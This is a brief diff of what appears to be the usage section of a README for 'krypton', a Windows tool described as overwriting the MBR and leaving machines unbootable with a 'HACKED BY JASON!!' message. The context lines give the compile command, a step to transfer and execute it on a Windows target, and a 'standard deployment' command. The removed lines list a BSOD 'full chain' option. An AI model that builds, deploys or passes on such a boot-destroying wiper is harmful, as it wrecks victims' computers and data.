@@ -131,12 +131,6 @@ BIOS → "HACKED BY JASON!!" (Unbootable)
 x86_64-w64-mingw32-g++ -static -O2 krypton.cpp -o krypton.exe
 
 # 2. Transfer & Execute (Windows Target)
-# krypton.exe --bsod  # Full chain
-# krypton.exe         # MBR + Auto-restart
-Usage
-powershell
-
-
 
 # Standard deployment (MBR + Auto-restart)
 krypton.exe
